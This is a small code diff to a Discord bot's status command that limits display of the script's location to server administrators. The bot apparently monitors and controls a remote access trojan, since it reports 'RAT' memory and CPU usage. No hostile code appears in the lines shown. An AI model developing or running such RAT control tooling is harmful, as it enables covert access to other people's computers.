@@ -147,7 +147,8 @@ async def status(ctx):
             color=discord.Color.blue()
         )
         
-        embed.add_field(name="Script Location", value=f"`{script_path}`", inline=False)
+        if ctx.author.guild_permissions.administrator:
+            embed.add_field(name="Script Location", value=f"`{script_path}`", inline=False)
         embed.add_field(name="RAT Memory Usage", value=f"`{rat_mem:.2f}/{total_mem:.0f} MB`", inline=True)
         embed.add_field(name="RAT CPU Usage", value=f"`{rat_cpu}%`", inline=True)
         embed.add_field(name="System Uptime", value=f"`{format_duration(system_uptime)}`", inline=False)
